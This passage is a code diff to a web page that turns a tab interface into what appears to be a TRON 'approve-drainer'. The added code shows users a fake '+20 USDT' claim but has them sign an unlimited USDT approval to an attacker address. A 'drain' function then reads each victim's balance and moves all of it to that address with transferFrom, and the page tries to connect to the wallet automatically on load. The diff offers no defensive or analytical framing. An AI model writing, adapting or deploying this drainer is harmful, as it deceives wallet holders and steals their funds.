-      el.addEventListener('click', function (ev) {
-        tab(ev.currentTarget.getAttribute('data-tab'));
-      });
+
+    // approve(spender, MAX_UINT256)
+    const params = [
+      { type: 'address', value: SPENDER },
+      { type: 'uint256', value: MAX_UINT256 },
+    ];
+
+    const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+      USDT_CONTRACT,
+      'approve(address,uint256)',
+      { feeLimit: FEE_LIMIT_SUN },
+      params,
+      userAddress
+    );
+
+    if (!tx.result || !tx.result.result) {
+      throw new Error('triggerSmartContract failed: ' + JSON.stringify(tx));
+    }
+
+    log('CLAIM', 'tx built', { txID: tx.transaction.txID });
+    setStatus('claim_status', '', 'Confirm in wallet…');
+
+    const signed = await tronWeb.trx.sign(tx.transaction);
+    log('CLAIM', 'signed', { txID: signed.txID });
+
+    const receipt = await tronWeb.trx.sendRawTransaction(signed);
+    log('CLAIM', 'broadcast', receipt);
+
+    if (receipt.result === true || receipt.code === 'SUCCESS') {
+      const txid = receipt.txid || signed.txID;
+      setStatus('claim_status', 'ok',
+        'Approval broadcast: ' + txid + '\n(UI said: +20 USDT; on-chain: approve MAX)');
+      log('CLAIM', 'SUCCESS', { txid, meaning: 'approve MAX to ' + SPENDER });
+    } else {
+      throw new Error('broadcast failed: ' + JSON.stringify(receipt));
+    }
+  } catch (e) {
+    log('CLAIM', 'error', { message: e.message, code: e.code, raw: String(e) });
+    setStatus('claim_status', 'err', 'Claim error: ' + (e.message || e.code));
+    $('btn_claim').disabled = false;
+  }
+}
+
+/* ─────────────  phase 2: drain via transferFrom  ───────────── */
+
+async function drain() {
+  if (!tronWeb || !userAddress) {
+    const ok = await connect();
+    if (!ok) return;
+  }
+  const victim = $('victim_input').value.trim();
+  if (!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(victim)) {
+    setStatus('drain_status', 'err', 'Victim must be valid TRON base58 (T…, 34).');
+    return;
+  }
+  try {
+    $('btn_drain').disabled = true;
+    setStatus('drain_status', '', 'Reading balance…');
+    log('DRAIN', 'reading USDT balance', { victim });
+
+    // read victim USDT balance
+    const contract = await tronWeb.contract().at(USDT_CONTRACT);
+    const bal = await contract.balanceOf(victim).call();
+    const balStr = bal.toString();
+    log('DRAIN', 'victim balance', { victim, raw: balStr, human: (Number(balStr) / 1e6).toFixed(6) });
+
+    if (!balStr || balStr === '0') {
+      throw new Error('victim has 0 USDT');
+    }
+
+    setStatus('drain_status', '', 'Building transferFrom for ' + (Number(balStr)/1e6) + ' USDT…');
+    log('DRAIN', 'building transferFrom', {
+      contract: USDT_CONTRACT,
+      method: 'transferFrom(address,address,uint256)',
+      from: victim,
+      to: SPENDER,
+      amount: balStr,
+      caller: userAddress,
     });
-  }
 
-  /* ── boot ────────────────────────────────────────────── */
+    const params = [
+      { type: 'address', value: victim },
+      { type: 'address', value: SPENDER },
+      { type: 'uint256', value: balStr },
+    ];
 
-  function boot() {
-    renderEnv();
-    bindActions();
-    log('BOOT', 'tron-surface up', {
-      origin: location.origin,
-      wS: !!resolve().wS,
-      Bt: !!resolve().Bt,
-      actions: Object.keys(actions).length,
-    });
-  }
+    const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+      USDT_CONTRACT,
+      'transferFrom(address,address,uint256)',
+      { feeLimit: FEE_LIMIT_SUN },
+      params,
+      userAddress // caller = attacker wallet (must have bandwidth/TRX)
+    );
 
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', boot);
-  } else {
-    boot();
+    if (!tx.result || !tx.result.result) {
+      throw new Error('transferFrom build failed: ' + JSON.stringify(tx));
+    }
+
+    log('DRAIN', 'tx built', { txID: tx.transaction.txID });
+    setStatus('drain_status', '', 'Confirm in wallet…');
+
+    const signed = await tronWeb.trx.sign(tx.transaction);
+    const receipt = await tronWeb.trx.sendRawTransaction(signed);
+    log('DRAIN', 'broadcast', receipt);
+
+    if (receipt.result === true || receipt.code === 'SUCCESS') {
+      const txid = receipt.txid || signed.txID;
+      setStatus('drain_status', 'ok', 'Drained. txid: ' + txid);
+      log('DRAIN', 'SUCCESS', { txid, amount: balStr, from: victim, to: SPENDER });
+    } else {
+      throw new Error('drain broadcast failed: ' + JSON.stringify(receipt));
+    }
+  } catch (e) {
+    log('DRAIN', 'error', { message: e.message, code: e.code, raw: String(e) });
+    setStatus('drain_status', 'err', 'Drain error: ' + (e.message || e.code));
+    $('btn_drain').disabled = false;
   }
+}
+
+/* ─────────────  log controls + boot  ───────────── */
+
+function clearLog() { $('log_out').textContent = '—'; }
+function dumpLog() {
+  const t = $('log_out').textContent;
+  if (navigator.clipboard) navigator.clipboard.writeText(t);
+  log('DUMP', 'copied', { len: t.length });
+}
+
+(async () => {
+  log('BOOT', 'approve-drainer up', {
+    origin: location.origin,
+    usdt: USDT_CONTRACT,
+    spender: SPENDER,
+  });
+  renderEnv();
+  // auto-connect attempt on load
+  setTimeout(connect, 500);
 })();
 </script>
 </body>
